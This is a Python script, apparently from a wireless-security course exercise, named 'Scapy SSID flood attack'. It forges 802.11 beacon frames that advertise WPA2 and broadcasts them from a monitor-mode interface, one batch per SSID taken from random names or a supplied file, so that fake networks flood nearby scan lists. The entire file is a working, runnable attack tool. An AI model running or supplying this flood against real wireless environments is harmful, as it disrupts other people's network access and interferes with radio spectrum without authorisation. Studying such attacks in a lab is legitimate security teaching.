import argparse

import netifaces
from scapy.all import *
from scapy.layers.dot11 import Dot11Elt, RadioTap, Dot11, Dot11Beacon

parser = argparse.ArgumentParser(prog="Scapy SSID flood attack",
                                 usage="ssid_flood.py -i wlp2s0mon [-n 5 | -f path/to/file] [-c 10]",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to use, needs to be set to monitor mode")
parser.add_argument("-n", "--ssid-number", required=False, help="The amount of fake SSIDs to generate")
parser.add_argument("-f", "--ssid-file", required=False, help="A file with ssid names to flood with")
parser.add_argument("-c", "--count", required=False, help="Number of beacons to send per ssid", default="10")

args = parser.parse_args()

def generate_beacon_frame():
    """
    Generate a beacon trame (like in the fake channel)
    :return: a beacon trame with no ssid defined
    """
    interface = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK]

    dot11 = Dot11(type=0, subtype=8, addr1=interface[0]['broadcast'], addr2=interface[0]['addr'],
                  addr3=interface[0]['addr'])

    beacon = Dot11Beacon(cap='ESS+privacy')

    channel = Dot11Elt(ID='DSset', info=chr(11))

    rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'
        '\x00\x0f\xac\x02'
        '\x02\x00'
        '\x00\x0f\xac\x04'
        '\x00\x0f\xac\x02'
        '\x01\x00'
        '\x00\x0f\xac\x02'
        '\x00\x00'))

    return RadioTap() / dot11 / beacon / channel / rsn


def send_beacon(interface, ssid, count):
    """
    Send a beacon frame with a given ssid
    :param interface: The interface to send the packet from
    :param ssid: The SSID to put into the packet
    :param count: the number of time to send the beacon
    """
    essid = Dot11Elt(ID='SSID', info=str(ssid), len=len(str(ssid)))
    frame = generate_beacon_frame() / essid
    print("Sending {:d} beacons for ssid {}".format(int(count), ssid))
    sendp(frame, iface=interface, inter=1, count=int(count))


# If no SSID name file given generate random names
if args.ssid_number:
    for _ in range(int(args.ssid_number)):
        send_beacon(args.Interface, str(uuid.uuid4())[:8], args.count)
else:
    with open(args.ssid_file) as f:
        for line in f:
            # SSID can be max 32 char
            if len(line) > 32:
                continue
            send_beacon(args.Interface, line, args.count)
